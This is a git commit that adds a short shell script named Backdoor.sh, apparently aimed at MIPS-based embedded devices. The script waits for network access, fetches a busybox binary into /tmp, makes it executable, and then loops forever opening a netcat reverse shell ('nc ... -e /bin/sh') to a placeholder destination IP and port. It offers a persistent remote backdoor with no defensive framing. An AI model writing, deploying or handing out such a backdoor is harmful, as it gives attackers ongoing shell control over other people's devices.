743467d6aca111885b1c6e8c1b41e6890f7f88ef
anindya14 <anindya.ece011@gmail.com>
2020-09-09 16:04:42 +0530

    Create Backdoor.sh

---
+++ Backdoor.sh
@@ -0,0 +1,16 @@
+#!/bin/sh
+
+#checking internet
+While ! ping -c 1 google.com;
+do 
+    sleep 1
+done
+
+cd /tmp
+wget https://www.busybox.net/downloads/binaries/1.21.1/busybox-mipsel
+chmod +x busybox-mipsel
+
+while true;
+do 
+    ./busybox-mipsel nc dest-ip-to-connect port-to-connect -e /bin/sh
+done
